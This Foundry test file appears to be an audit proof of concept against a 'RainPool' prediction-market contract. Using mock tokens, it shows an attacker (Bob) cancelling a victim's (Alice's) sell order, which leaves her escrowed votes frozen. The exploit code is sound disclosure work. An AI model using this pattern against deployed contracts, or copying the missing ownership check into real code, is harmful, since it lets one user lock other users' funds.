// SPDX-License-Identifier: MIT
pragma solidity ^0.8.26;

import {Test, console} from "forge-std/Test.sol";
import {RainPool, IRainPool} from "../src/RainPool.sol";
import {ERC20Mock} from "../src/mocks/ERC20Mock.sol";

contract PoCCancelOrder is Test {
    RainPool public rainPool;
    ERC20Mock public baseToken;

    address public owner = makeAddr("owner");
    address public alice = makeAddr("alice");
    address public bob = makeAddr("bob");
    address public platform = makeAddr("platform");
    address public resolver = makeAddr("resolver");
    address public rainTokenAddr = makeAddr("rainToken");
    address public swapRouter = makeAddr("swapRouter");

    function setUp() public {
        baseToken = new ERC20Mock(
            "Mock USDT",
            "USDT",
            6
        );

        uint256 initialLiquidity =
            2_000_000 * 1e6;

        uint256 userAmount =
            1_000_000 * 1e6;

        baseToken.mint(
            owner,
            initialLiquidity
        );

        baseToken.mint(
            alice,
            userAmount
        );

        baseToken.mint(
            bob,
            userAmount
        );

        uint256[] memory percentages =
            new uint256[](2);

        percentages[0] = 50;
        percentages[1] = 50;

        uint256 startTime =
            block.timestamp + 1 hours;

        IRainPool.Params memory params =
            IRainPool.Params({
                initialLiquidity: initialLiquidity,
                liquidityPercentages: percentages,
                isPublic: true,
                resolverIsAI: false,
                deployerContract: address(this),
                baseToken: address(baseToken),
                baseTokenDecimals: 6,
                poolOwner: owner,
                platformAddress: platform,
                resolver: resolver,
                rainToken: rainTokenAddr,
                swapRouter: swapRouter,
                startTime: startTime,
                endTime: startTime + 1 days,
                numberOfOptions: 2,
                platformFee: 25,
                liquidityFee: 12,
                creatorFee: 12,
                resultResolverFee: 1,
                oracleFixedFee: 1,
                oracleEndTime: startTime + 2 days,
                ipfsUri: "ipfs://test"
            });

        rainPool = new RainPool(params);

        vm.prank(owner);
        baseToken.transfer(
            address(rainPool),
            initialLiquidity
        );

        vm.warp(startTime);

        vm.startPrank(alice);
        baseToken.approve(
            address(rainPool),
            userAmount
        );
        rainPool.enterOption(
            1,
            userAmount
        );
        vm.stopPrank();

        vm.startPrank(bob);
        baseToken.approve(
            address(rainPool),
            userAmount
        );
        rainPool.enterOption(
            1,
            userAmount
        );
        vm.stopPrank();
    }

    function test_AttackerCancelsVictimOrder()
        public
    {
        uint256 option = 1;
        uint256 price = 0.5 ether;

        uint256 aliceVotesToSell =
            rainPool.userVotes(
                option,
                alice
            ) / 2;

        vm.prank(alice);
        uint256 aliceOrderId =
            rainPool.placeSellOrder(
                option,
                price,
                aliceVotesToSell
            );

        uint256 bobVotesToSell =
            rainPool.userVotes(
                option,
                bob
            );

        vm.prank(bob);
        rainPool.placeSellOrder(
            option,
            price,
            bobVotesToSell
        );

        (
            bool orderExistsBefore,
        ) = rainPool.orderBook(
            option,
            price,
            aliceOrderId
        );

        assertTrue(
            orderExistsBefore,
            "Alice's order should exist"
        );

        uint256[] memory options =
            new uint256[](1);

        uint256[] memory prices =
            new uint256[](1);

        uint256[] memory orderIds =
            new uint256[](1);

        options[0] = option;
        prices[0] = price;
        orderIds[0] = aliceOrderId;

        vm.prank(bob);
        rainPool.cancelSellOrders(
            options,
            prices,
            orderIds
        );

        (
            bool orderExistsAfter,
        ) = rainPool.orderBook(
            option,
            price,
            aliceOrderId
        );

        assertFalse(
            orderExistsAfter,
            "Bob could not cancel Alice's order"
        );

        assertEq(
            rainPool.userVotesInEscrow(
                option,
                alice
            ),
            aliceVotesToSell,
            "Alice's escrow was returned"
        );

        assertTrue(
            rainPool.userVotesInEscrow(
                option,
                bob
            ) < bobVotesToSell,
            "Bob's escrow was not reduced"
        );

        console.log(
            "Alice's order was removed"
        );

        console.log(
            "Alice's escrow remains frozen:",
            rainPool.userVotesInEscrow(
                option,
                alice
            )
        );

        console.log(
            "Bob's escrow after cancellation:",
            rainPool.userVotesInEscrow(
                option,
                bob
            )
        );
    }
}
